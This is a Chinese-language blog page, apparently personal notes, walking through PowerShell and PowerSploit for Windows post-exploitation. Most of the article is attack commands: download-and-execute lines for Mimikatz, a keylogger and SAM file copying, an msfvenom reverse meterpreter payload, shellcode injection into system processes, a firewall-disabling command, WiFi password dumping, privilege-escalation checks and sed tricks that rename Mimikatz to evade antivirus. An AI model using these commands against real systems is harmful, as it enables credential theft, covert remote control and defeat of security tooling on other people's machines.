@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>57PowerShell | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>57PowerShell</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2022-01-26
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="57PowerShell"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>网络安全(一)PowerShell</p>
+<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><h3 id="PowerShell-1"><a href="#PowerShell-1" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>Windows PowerShell 是一种命令行外壳程序和脚本环境，让命令行用户和脚本编写者可以利用 .NET Framework 的强大功能。</p>
+<p>它引入了许多非常有用的新概念，进一步扩展了Windows命令提示符和Windows Script Host环境中获得的知识和创建的脚本。 </p>
+<p>Windows PowerShell v3 将伴随着 Microsoft Hyper-V 3.0 和 Windows Server 2012 发布。PowerShell v3 是一个 Windows 任务自动化的框架，它由一个命 令行 shell 和内置在这个.NET 框架上的编程语言组成。 PowerShell v3 采用新的 cmdlet 让管理员能够更深入到系统进程中，这些进程可以制作成可执行的文件或脚本（script）。cmdlet 是一条轻量命令， Windows PowerShell 运行时间在自动化脚本的环境里调用它。 Cmdlet 包括显示当前目录的 Get-Location，访问文件内容的 Get-Content 和结束运行进程的 Stop-Process。 PowerShell v3 在 Windows Server 8 中装载了 Windows Management Framework 3.0。PowerShell 运行环境也能嵌入到其它应用中。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
+<li>在Windows 7以上的操作系统中是默认安装的。</li>
+<li>PowerShell脚本可以运行在内存中，不需要写入磁盘。</li>
+<li>几乎不会触发杀毒软件。</li>
+<li>可以远程执行。</li>
+<li>目前很多工具都是基于PowerShell开发的。</li>
+<li>使得Windows的脚本攻击变得更加容易。</li>
+<li>cmd.exe通常会被阻止运行，但是PowerShell不会。</li>
+<li>可以用来管理活动目录。</li>
+</ol>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载地址  <a href="https://github.com/PowerShell/PowerShell/releases">https://github.com/PowerShell/PowerShell/releases</a></p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>net user  查看本地用户列表<br>net accounts  查看本地密码策略<br>net localgroup  查看当前计算机中所有组<br>net localgroup administrators  查看管理员组的信息(哪些用户为管理员)<br>net statistics workstation  查看主机开机时间和开机后的网络状态<br>net session  列出本地计算机连接的客户端对话信息<br>net start  查看本地端口</p>
+<p>net share  查看本机共享列表和可访问的域共享列表<br>net use 本地盘符 \目标 IP 地址\目标共享名: 这里目标共享名可以通过对 目标执行<br>共享文件夹挂载到本地 net use i: \192.168.1.230\www<br>net share 查看,这条命令可以将目标盘符挂载到我们本地</p>
+<p>type  相当于 Linux 中的cat,用于查看一些文本文件<br>type C:\Windows\system32\drivers\etc\hosts  查看hosts文件</p>
+<p>whoami  查看当前使用的用户信息<br>whoami /all  查看更详细的信息<br>quser 和 qwinsta  查看当前所有在线用户和会话<br>quser用户名或会话名 和 qwinsta用户名或会话名  查看指定在线用户<br>命令效果差不多,一个优先显示用户,一个是优先显示会话 </p>
+<p>ipconfig  查看当前计算机网络信息<br>ipconfig /all  查看更详细的网络信息<br>ipconfig /displaydns: 查看 DNS 缓存信息<br>systeminfo: 查看计算机系统详细信息(比如:CPU 信息,系统具体版本信息,当 前安装的补丁,网卡信息等等)<br>systeminfo.exe | findstr “OS”  查看系统相关信息,(使用 findstr 进行搜 索指定的信息,搜索的时候字母大小写是有区别的) systeminfo.exe | findstr “KB”  查看补丁列表</p>
+<p>wmic  使用此命令可以查看更多的系统软硬件相关信息。可以直接使用 wmic os、wmic cpu 等方式查看需要的信息</p>
+<p>ps 查看任务管理器中内容<br>schtasks 查看计划任务(Windows8 之前可以使用 at),可以使用 schtasks /query /fo list /v(使用列表格式/fo list 显示所有计划任务/query 的详细信 息/v)</p>
+<p>cmdkey  创建，显示和删除保存的凭证信息(用户名和密码)<br>cmdkey /l  查看具体凭证信息</p>
+<p>netstat 查看本机各端口状态<br>netstat /ano: ano 是最常用的参数<br>  /a参数显示所有的连接(TCP 和 UDP 都有)<br>  /n以数字形式显示地址和端口号<br>  /o显示与每个连接关联的进程 ID<br>  (使用 netstat -ano |findstr “端口号”命令可以查看指定端口信息)<br>  netstat /anob  如果权限足够,还可以使用参数/b,他可以显示在创建每个连接 或 侦听端口时涉及的可执行文件</p>
+<p>netsh wlan show profiles  查看当前保存过的WiFi<br>netsh wlan show profile name=WIFI名称  查看WiFi的详细信息<br>netsh wlan show profile name=WIFI名称 key=clear  查看WiFi的详细信息以及密码</p>
+<p>netsh firewall set opmode disable  查看防火墙配置(已弃用)<br>netsh advfirewall firewall show rule name=all  查看已配置的防火墙规则<br>netsh advfirewall set allprofiles state off  关闭所有防火墙(包括域,专 用,公共)此命令需要管理员权限,此命令只能在 Windows XP(Windows server 2003)之后的版本执行。老版本系统使用 netsh firewall set opmode disable 关闭域防火墙</p>
+<p>route  操作网络路由表<br>route print  查看路由表和地址解析协议(arp)缓存</p>
+<p>arp  显示和修改地址解析协议(ARP)使用的“IP 到物理”地址转换表<br>arp /a  查看地址解析协议缓存(找到内网中其他和目标主机通讯过的主机)</p>
+<p>reg query  查看注册表相关信息</p>
+<p>reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings” /v ProxyServer  查看代理信息(全局代理时使用此命令查看)</p>
+<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>查看powershell的默认策略：  Get-ExecutionPolicy</p>
+<p>Unrestricted 权限最高，可以不受限制执行任意脚本<br>Restricted 默认策略，不允许任意脚本的执行<br>AllSigned 所有脚本必须经过签名运行<br>RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名<br>Bypass 没有任何限制和提示<br>Undefined 没有设置脚本的策略</p>
+<p>Set-ExecutionPolicy Unrestricted 可能会被防护软件发现</p>
+<h2 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h2><p>PowerSploit是PowerShell脚本的集合，集成了很多渗透测试能用到的脚本，是针对win系统进行后渗透的利器。</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>使用方法就是将脚本文件放在web服务器上，通过PowerShell的远程加载实现文件不落地执行</p>
+<h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3><ol>
+<li>Invoke-mimikatz 猕猴桃获取hash神器，通过powershell调用mimikatz</li>
+</ol>
+<p>iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&#39;">http://192.168.10.1/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&#39;</a>)</p>
+<p>然后使用mimikatz获取hash即可（管理员权限）</p>
+<p>Invole-mimikatz -command sekurlsa::logonpassword #会被win10阻拦<br>Invole-mimikatz -command lsadump::asm           #从sam文件中获取</p>
+<ol start="2">
+<li>Get-Keystrokes 键盘记录器 ，记录按键、时间和活动窗口 ，主要是窃取账户密码用</li>
+</ol>
+<p>iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Exfiltration/Get-Keystrokes.ps1&#39;">http://192.168.10.1/PowerSploit/Exfiltration/Get-Keystrokes.ps1&#39;</a>)<br>Get-Keystrokes -LogPath C:\123.txt</p>
+<ol start="3">
+<li>Invoke-NinjaCopy 复制一些系统无法复制的文件，如sam文件(管理员权限)</li>
+</ol>
+<p>iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1&#39;">http://192.168.10.1/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1&#39;</a>)<br>Invoke-NinjaCopy -Path c:\windows\system\config\sam -LocalDestination C:\windows\temp\sam</p>
+<p>Get-TimedScreenshot 截屏并保存在指定文件夹下</p>
+<p>Get-TimedScreenshot -Path c:\windows\temp\ -Interval 10 -EndTime 12:00</p>
+<h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3><p>这个模块就是用来执行各种代码的，注入shellcode，注入dll等等</p>
+<p>Invoke-Shellcode</p>
+<ol>
+<li>常用的是调用Invoke-Shellcode模块将shellcode注入到本地powershell当中执行。<br>首先生成shellcode，CS和msf的都可以</li>
+</ol>
+<p>msfvenom -p windows/x64/meterpreter/reverse_http Lhost=192.168.10.1 LPort=8000  -f powershell</p>
+<p>powershell接收的shellcode格式是0x00</p>
+<p>[Byte[]] $buf = 0xfc,0x48,0x83……</p>
+<p>然后用模块加载shellcode，-Force参数会默认执行载荷</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&#39;">http://192.168.10.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&#39;</a>)<br>get-help Invoke-Shellcode<br>Invoke-ShellCode -Force -Shellcode 0xfc,0x84….</p>
+<p>或者将shellcode放在服务器上</p>
+<p>IEX(New-Object net.webclient).Downloadstring(“<a target="_blank" rel="noopener" href="http://192.168.10.1/123.txt&quot;">http://192.168.10.1/123.txt&quot;</a>)<br>Invole-ShellCode -Force -Shellcode $buf</p>
+<p>都可以与msf建立连接，但是ps窗口关闭，连接就会断</p>
+<ol start="2">
+<li>调用Invoke-Shellcode模块将shellcode注入到进程当中</li>
+</ol>
+<p>因为进程关闭，连接也会停止，所以最好注入到系统进程中去</p>
+<p>首先查看注入的进程 ，记录PID值</p>
+<p>taklist<br>ps -Name lsm</p>
+<p>注入到该进程,不成功就尝试别的进程</p>
+<p>Invole-ShellCode -Shellcode -Force $buf -ProcessID 496</p>
+<p>可以开启一个隐藏进程进行注入</p>
+<p>start-process C:\windows\system32\notepad.exe -WindowStyle Hidden<br>Get-Process Notepad</p>
+<h3 id="Invoke-Dllinjection"><a href="#Invoke-Dllinjection" class="headerlink" title="Invoke-Dllinjection"></a>Invoke-Dllinjection</h3><p>顾名思义注入dll，但这个就需要将dll文件上传到目标机了，文件落地比较危险。</p>
+<p>先加载该模块</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/ps/Exfiltration/Invoke-Mimikatz.ps1&#39;">http://192.168.10.1/ps/Exfiltration/Invoke-Mimikatz.ps1&#39;</a>)</p>
+<p>将dll文件上传主机后，进行注入到程序</p>
+<p>Invoke-DllInjection -Dll ./test.dll -ProcessId 8787</p>
+<h3 id="Privesc模块"><a href="#Privesc模块" class="headerlink" title="Privesc模块"></a>Privesc模块</h3><p>提权模块，常用的就是使用Get-System提升管理员权限</p>
+<p>PowerUP 用来寻找目标主机windows服务漏洞进行提权的使用脚本</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Privesc/PowerUp.ps1&#39;">http://192.168.10.1/PowerSploit/Privesc/PowerUp.ps1&#39;</a>)</p>
+<ol>
+<li>Invoke-AllChecks 自动执行PowerUp下所有的脚本来检查目标主机 </li>
+<li>Find-PathDllHijack 检查当前%PATH%的哪些目录是用户可以写入的</li>
+<li>Get-ApplicationHost 利用系统上的application.config文件恢复加密过的应用池和虚拟目录的密码</li>
+<li>Get-RegistryAlwaysInstallElevated 检测AlwaysInstallElevated注册表是否被设置,如果被设置,意味着MSI文件是以SYSTEM权限运行的</li>
+<li>Get-RegistryAutoLogon 检测windows注册表的AutoAdminLogon项有没有被设置,可查询被设置默认的用户名密码</li>
+<li>Get-ServiceDetail –ServiceName DHCP 返回某服务的信息</li>
+<li>Get-ServiceFilePermission 检测当前用户能够在哪些服务的目录写入相关的可执行文件(可以通过这些文件提权)</li>
+<li>Test-ServiceDaclPermission 检测所有可用的服务,并尝试对这些打开的服务进行修改(若可修改,返回服务对象)</li>
+<li>Get-UnattendedInstallFile 检查以下路径,查找是否存在这些文件(文件中可能包含部署凭据)</li>
+<li>Get-ServiceUnquoted 用于检查服务路径,返回包含空格但不带引号的服务路径</li>
+<li>Get-ModifiableRegistryAutoRun 检查开机自启动的应用程序路径和注册表键值,返回当前用户可修改的程序路径</li>
+<li>Get-ModifiableScheduledTaskFile 返回当前用户能够修改的计划任务程序的名称和路径</li>
+<li>Get-Webconfig 返回当前服务器上web.config文件中的数据库连接字符串的明文</li>
+</ol>
+<h3 id="Reacon模块"><a href="#Reacon模块" class="headerlink" title="Reacon模块"></a>Reacon模块</h3><p>这个模块就是用来扫内网的，通过该主机为跳板机探测内网主机、端口服务等</p>
+<ol>
+<li>Invoke_Portscan 就是用来扫描内网端口</li>
+</ol>
+<p>一样的步骤，先调用模块</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Recon/Invoke-Portscan.ps1&#39;">http://192.168.10.1/PowerSploit/Recon/Invoke-Portscan.ps1&#39;</a>)</p>
+<p>然后利用Invoke-Portscan扫就行了</p>
+<p>Invoke-Portscan -Host 192.168.10.6 -ports “1-1000”</p>
+<p>Invoke-ReverseDnsLookup 反向DNS查询，扫描内网主机的ip对应的主机名</p>
+<p>在内网或域内，每个IP都对应一个主机名</p>
+<p>Invoke-ReverseDnsLookup 192.168.10.0/24</p>
+<ol start="2">
+<li>Get-HttpStatus 扫描内网站点的web目录，需要一个字典</li>
+</ol>
+<p>Get-HttpStatus -Target 192.168.10.6 -Path C:\dict.txt</p>
+<ol start="3">
+<li>Get-ComputerDetails 获得登录信息</li>
+</ol>
+<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>powershell命令是可以在cmd直接运行的</p>
+<p>powershell -com iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/123.txt&#39;">http://192.168.10.1/123.txt&#39;</a>)</p>
+<p>如果调用模块必须进入powershell命令行</p>
+<p>powershell</p>
+<h3 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h3><ol>
+<li><p>Invoke-Mimikatz.ps1改为psyyds.ps1</p>
+</li>
+<li><p>删除一些空格和注释</p>
+</li>
+</ol>
+<p>sed -i -e ‘/&lt;#&gt;/c\‘ Invoke-Mimikatz.ps1<br>sed -i -e ‘s/^[[:space:]]<em>#.</em>$//g’ Invoke-Mimikatz.ps1</p>
+<ol start="3">
+<li>更改函数名</li>
+</ol>
+<p>sed -i -e ‘s/Invoke-Mimikatz/Invoke-miansha/g’ Invoke-Mimikatz.ps1<br>sed -i -e ‘s/DumpCreds/DumpCredd/g’ Invoke-Mimikatz.ps1</p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/57PowerShell/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2022/55%E6%8F%90%E6%9D%83/" target="_self">55提权</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2022/58%E5%86%85%E7%BD%91%E5%8F%8D%E5%BC%B9shell/" target="_self">58内网反弹shell</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
